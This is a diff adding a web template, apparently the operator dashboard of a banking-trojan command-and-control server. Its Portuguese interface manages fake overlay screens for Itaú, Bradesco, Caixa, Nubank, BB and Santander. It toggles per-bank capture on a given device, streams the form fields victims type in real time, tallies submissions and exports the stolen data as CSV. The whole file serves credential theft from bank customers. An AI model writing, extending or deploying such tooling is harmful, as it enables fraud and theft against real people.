@@ -1,0 +1,547 @@
+<style>
+    .fc-control {
+        margin-bottom: 20px;
+    }
+
+    .realtime-status {
+        display: inline-block;
+        padding: 12px 20px;
+        border-radius: 4px;
+        margin-bottom: 15px;
+        font-weight: bold;
+        font-size: 14px;
+    }
+
+    .realtime-status.active {
+        background-color: #4CAF50;
+        color: white;
+    }
+
+    .realtime-status.inactive {
+        background-color: #f44336;
+        color: white;
+    }
+
+    .realtime-badge {
+        display: inline-block;
+        padding: 4px 8px;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
+        border-radius: 4px;
+        font-size: 10px;
+        font-weight: bold;
+        margin-left: 10px;
+    }
+
+    .capture-sequence {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 15px;
+        margin-top: 15px;
+    }
+
+    .field-capture {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        border-left: 4px solid #667eea;
+        padding: 12px;
+        border-radius: 4px;
+        color: white;
+        position: relative;
+        animation: slideIn 0.3s ease-out;
+    }
+
+    @keyframes slideIn {
+        from {
+            transform: translateX(-20px);
+            opacity: 0;
+        }
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
+    }
+
+    .field-label {
+        font-size: 11px;
+        opacity: 0.8;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        margin-bottom: 4px;
+    }
+
+    .field-value {
+        font-size: 14px;
+        font-weight: bold;
+        font-family: monospace;
+        word-break: break-all;
+    }
+
+    .field-type {
+        position: absolute;
+        top: 8px;
+        right: 8px;
+        background: rgba(255, 255, 255, 0.2);
+        padding: 2px 6px;
+        border-radius: 3px;
+        font-size: 9px;
+        text-transform: uppercase;
+    }
+
+    .field-timestamp {
+        font-size: 10px;
+        opacity: 0.7;
+        margin-top: 6px;
+    }
+
+    .capture-stats {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 15px;
+        margin: 15px 0;
+    }
+
+    .stat-card {
+        background-color: #f5f5f5;
+        border-left: 4px solid #2196F3;
+        padding: 12px;
+        border-radius: 4px;
+    }
+
+    .stat-card.total {
+        border-left-color: #4CAF50;
+    }
+
+    .stat-card.fields {
+        border-left-color: #FF9800;
+    }
+
+    .stat-card.submissions {
+        border-left-color: #2196F3;
+    }
+
+    .stat-value {
+        font-size: 24px;
+        font-weight: bold;
+        color: #333;
+    }
+
+    .stat-label {
+        font-size: 12px;
+        color: #666;
+        margin-top: 4px;
+    }
+
+    .bank-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+        gap: 10px;
+        margin-top: 10px;
+    }
+
+    .bank-toggle {
+        padding: 10px;
+        border: 2px solid #ddd;
+        border-radius: 4px;
+        cursor: pointer;
+        text-align: center;
+        background-color: #f9f9f9;
+        transition: all 0.3s;
+    }
+
+    .bank-toggle.enabled {
+        background-color: #4CAF50;
+        color: white;
+        border-color: #45a049;
+    }
+
+    .bank-toggle:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 15px;
+        font-size: 12px;
+    }
+
+    .data-table th {
+        background-color: #2196F3;
+        color: white;
+        padding: 10px;
+        text-align: left;
+    }
+
+    .data-table td {
+        border: 1px solid #ddd;
+        padding: 8px;
+    }
+
+    .data-table tr:hover {
+        background-color: #f9f9f9;
+    }
+
+    .submission-row {
+        background-color: #fff3cd;
+        font-weight: bold;
+    }
+
+    .alert-banner {
+        background-color: #fff3cd;
+        border: 1px solid #ffc107;
+        color: #856404;
+        padding: 12px;
+        border-radius: 4px;
+        margin-bottom: 15px;
+    }
+
+    .alert-banner.success {
+        background-color: #d4edda;
+        border-color: #28a745;
+        color: #155724;
+    }
+
+    .alert-banner.danger {
+        background-color: #f8d7da;
+        border-color: #f5c6cb;
+        color: #721c24;
+    }
+</style>
+
+<div class="ui segment">
+    <h2 class="ui dividing header">
+        <i class="icon keyboard"></i> Customized Forms Capture (Telas Falsas Customizadas)
+        <span class="realtime-badge">REAL-TIME</span>
+    </h2>
+
+    <!-- Alert -->
+    <div id="alertMessage" style="display: none;"></div>
+
+    <!-- Real-time Status -->
+    <div class="realtime-status inactive" id="realtimeStatus">
+        ● Captura em tempo real desativada
+    </div>
+
+    <!-- Control Panel -->
+    <div class="fc-control">
+        <h4>Controle de Captura</h4>
+        <button class="ui button blue" id="enableRealtime">
+            <i class="icon play"></i> Ativar Captura em Tempo Real
+        </button>
+        <button class="ui button grey" id="disableRealtime">
+            <i class="icon stop"></i> Desativar Captura
+        </button>
+    </div>
+
+    <!-- Bank Selection -->
+    <div class="fc-control">
+        <h4>Bancos Habilitados para Captura</h4>
+        <div class="bank-grid" id="bankGrid">
+            <!-- Populated by JavaScript -->
+        </div>
+    </div>
+
+    <!-- Statistics -->
+    <div class="fc-control">
+        <h4>Estatísticas de Captura</h4>
+        <div class="capture-stats">
+            <div class="stat-card total">
+                <div class="stat-value" id="totalCaptured">0</div>
+                <div class="stat-label">Campos Capturados</div>
+            </div>
+            <div class="stat-card fields">
+                <div class="stat-value" id="uniqueFields">0</div>
+                <div class="stat-label">Campos Únicos</div>
+            </div>
+            <div class="stat-card submissions">
+                <div class="stat-value" id="formSubmissions">0</div>
+                <div class="stat-label">Formulários Enviados</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Real-time Capture Stream -->
+    <div class="fc-control">
+        <h4>Fluxo de Captura em Tempo Real</h4>
+        <p style="font-size: 12px; color: #666;">Campos capturados aparecem em tempo real abaixo:</p>
+        <div class="capture-sequence" id="captureStream">
+            <p style="color: #999; font-style: italic; grid-column: 1 / -1;">Aguardando captura...</p>
+        </div>
+    </div>
+
+    <!-- Captured Data Table -->
+    <div class="fc-control">
+        <h4>Dados Capturados - Completo</h4>
+        <button class="ui button red" id="clearData">
+            <i class="icon trash"></i> Limpar Dados
+        </button>
+        <button class="ui button blue" id="downloadData">
+            <i class="icon download"></i> Baixar CSV
+        </button>
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th style="width: 15%;">Banco</th>
+                    <th style="width: 20%;">Campo</th>
+                    <th style="width: 25%;">Valor</th>
+                    <th style="width: 15%;">Tipo</th>
+                    <th style="width: 25%;">Data/Hora</th>
+                </tr>
+            </thead>
+            <tbody id="dataTableBody">
+                <tr>
+                    <td colspan="5" style="text-align: center; color: #999;">Nenhum dado capturado</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Operation Log -->
+    <div class="fc-control">
+        <h4>Log de Operações</h4>
+        <button class="ui button red" id="clearLog">
+            <i class="icon trash"></i> Limpar Log
+        </button>
+        <div id="operationLog" style="max-height: 300px; overflow-y: auto; margin-top: 15px;">
+            <p style="color: #999; font-style: italic;">Nenhuma operação registrada</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    let fcData = <%- JSON.stringify(pageData) %>;
+    const deviceID = '<%= deviceID %>';
+    const baseURL = '<%= baseURL %>';
+    const banks = ['itau', 'bradesco', 'caixa', 'nubank', 'bb', 'santander'];
+    
+    let captureBuffer = [];
+    let updateInterval;
+
+    document.addEventListener('DOMContentLoaded', function() {
+        initializeBankGrid();
+        updateUI();
+        updateInterval = setInterval(updateUI, 1000);
+    });
+
+    function initializeBankGrid() {
+        const grid = document.getElementById('bankGrid');
+        grid.innerHTML = '';
+        banks.forEach(bank => {
+            const btn = document.createElement('button');
+            btn.className = 'bank-toggle' + (fcData.enabledBanks[bank] ? ' enabled' : '');
+            btn.textContent = bank.toUpperCase();
+            btn.onclick = () => toggleBank(bank);
+            grid.appendChild(btn);
+        });
+    }
+
+    function toggleBank(bank) {
+        const endpoint = fcData.enabledBanks[bank] ? `/manage/${deviceID}/fc/disable_bank/${bank}` : `/manage/${deviceID}/fc/enable_bank/${bank}`;
+        fetch(endpoint, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    fcData.enabledBanks[bank] = !fcData.enabledBanks[bank];
+                    initializeBankGrid();
+                    showAlert('Banco ' + bank + ' ' + (fcData.enabledBanks[bank] ? 'ativado' : 'desativado'), 'success');
+                } else {
+                    showAlert('Erro: ' + data.error, 'danger');
+                }
+            });
+    }
+
+    document.getElementById('enableRealtime').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/fc/enable_realtime`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    fcData.realTimeCaptureEnabled = true;
+                    updateUI();
+                    showAlert('Captura em tempo real ativada!', 'success');
+                }
+            });
+    });
+
+    document.getElementById('disableRealtime').addEventListener('click', function() {
+        fetch(`/manage/${deviceID}/fc/disable_realtime`, { method: 'POST' })
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    fcData.realTimeCaptureEnabled = false;
+                    updateUI();
+                    showAlert('Captura em tempo real desativada', 'success');
+                }
+            });
+    });
+
+    document.getElementById('clearData').addEventListener('click', function() {
+        if (confirm('Tem certeza que deseja limpar todos os dados capturados?')) {
+            fetch(`/manage/${deviceID}/fc/data`, { method: 'DELETE' })
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.error) {
+                        fcData.capturedData = [];
+                        captureBuffer = [];
+                        updateUI();
+                        showAlert('Dados capturados limpados', 'success');
+                    }
+                });
+        }
+    });
+
+    document.getElementById('clearLog').addEventListener('click', function() {
+        if (confirm('Tem certeza que deseja limpar o log de operações?')) {
+            fetch(`/manage/${deviceID}/fc/log`, { method: 'DELETE' })
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.error) {
+                        fcData.captureLog = [];
+                        updateUI();
+                        showAlert('Log limpado', 'success');
+                    }
+                });
+        }
+    });
+
+    document.getElementById('downloadData').addEventListener('click', function() {
+        let csv = 'Banco,Campo,Valor,Tipo,Data/Hora\n';
+        fcData.capturedData.forEach(entry => {
+            csv += `"${entry.bankName}","${entry.fieldName}","${entry.fieldValue}","${entry.fieldType}","${new Date(entry.timestamp).toLocaleString('pt-BR')}"\n`;
+        });
+        
+        const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+        const link = document.createElement('a');
+        const url = URL.createObjectURL(blob);
+        link.setAttribute('href', url);
+        link.setAttribute('download', 'captured_forms_' + new Date().getTime() + '.csv');
+        link.style.visibility = 'hidden';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        showAlert('Dados baixados em CSV', 'success');
+    });
+
+    function updateUI() {
+        fetch(`/manage/${deviceID}/fc/data`)
+            .then(r => r.json())
+            .then(data => {
+                if (!data.error) {
+                    fcData = data.data;
+                    updateRealtimeStatus();
+                    updateCaptureStream();
+                    updateDataTable();
+                    updateStatistics();
+                    updateOperationLog();
+                }
+            });
+    }
+
+    function updateRealtimeStatus() {
+        const status = document.getElementById('realtimeStatus');
+        if (fcData.realTimeCaptureEnabled) {
+            status.textContent = '● Captura em tempo real ATIVA';
+            status.classList.remove('inactive');
+            status.classList.add('active');
+        } else {
+            status.textContent = '● Captura em tempo real desativada';
+            status.classList.remove('active');
+            status.classList.add('inactive');
+        }
+    }
+
+    function updateCaptureStream() {
+        const stream = document.getElementById('captureStream');
+        
+        // Mostrar últimos 5 campos capturados
+        let recent = fcData.capturedData.slice(-5).reverse();
+        
+        if (recent.length === 0) {
+            stream.innerHTML = '<p style="color: #999; font-style: italic; grid-column: 1 / -1;">Aguardando captura...</p>';
+            return;
+        }
+        
+        stream.innerHTML = recent.map(field => {
+            let value = field.fieldValue;
+            if (field.fieldType === 'password' || field.fieldName.toLowerCase().includes('senha')) {
+                value = '●●●●●●●●';
+            }
+            
+            return `
+                <div class="field-capture">
+                    <div class="field-type">${field.fieldType}</div>
+                    <div class="field-label">${field.fieldName}</div>
+                    <div class="field-value">${value}</div>
+                    <div class="field-timestamp">${new Date(field.timestamp).toLocaleTimeString('pt-BR')}</div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    function updateStatistics() {
+        const totalCaptured = fcData.capturedData.filter(d => d.fieldType !== 'submission').length;
+        const uniqueFields = new Set(fcData.capturedData.filter(d => d.fieldType !== 'submission').map(d => d.fieldName)).size;
+        const formSubmissions = fcData.capturedData.filter(d => d.fieldType === 'submission').length;
+        
+        document.getElementById('totalCaptured').textContent = totalCaptured;
+        document.getElementById('uniqueFields').textContent = uniqueFields;
+        document.getElementById('formSubmissions').textContent = formSubmissions;
+    }
+
+    function updateDataTable() {
+        const tbody = document.getElementById('dataTableBody');
+        
+        if (fcData.capturedData.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #999;">Nenhum dado capturado</td></tr>';
+            return;
+        }
+        
+        tbody.innerHTML = fcData.capturedData.map(entry => {
+            let value = entry.fieldValue;
+            if (entry.fieldType === 'password' || entry.fieldName.toLowerCase().includes('senha')) {
+                value = '●●●●●●●●';
+            }
+            if (entry.fieldType === 'submission') {
+                value = '<strong>FORM SUBMITTED</strong>';
+            }
+            
+            return `
+                <tr ${entry.fieldType === 'submission' ? 'class="submission-row"' : ''}>
+                    <td>${entry.bankName}</td>
+                    <td><strong>${entry.fieldName}</strong></td>
+                    <td><code style="font-size: 11px;">${value}</code></td>
+                    <td><span class="ui label" style="font-size: 11px;">${entry.fieldType}</span></td>
+                    <td>${new Date(entry.timestamp).toLocaleString('pt-BR')}</td>
+                </tr>
+            `;
+        }).join('');
+    }
+
+    function updateOperationLog() {
+        const container = document.getElementById('operationLog');
+        
+        if (fcData.captureLog.length === 0) {
+            container.innerHTML = '<p style="color: #999; font-style: italic;">Nenhuma operação registrada</p>';
+            return;
+        }
+        
+        container.innerHTML = fcData.captureLog.slice().reverse().map(log => `
+            <div class="alert-banner ${log.success ? 'success' : 'danger'}">
+                <strong>${log.action}</strong> - ${log.bankName}<br>
+                <small>${new Date(log.timestamp).toLocaleString('pt-BR')}</small><br>
+                ${log.details}
+            </div>
+        `).join('');
+    }
+
+    function showAlert(message, type) {
+        const alertDiv = document.getElementById('alertMessage');
+        alertDiv.className = 'alert-banner ' + type;
+        alertDiv.textContent = message;
+        alertDiv.style.display = 'block';
+        
+        setTimeout(() => {
+            alertDiv.style.display = 'none';
+        }, 3000);
+    }
+</script>
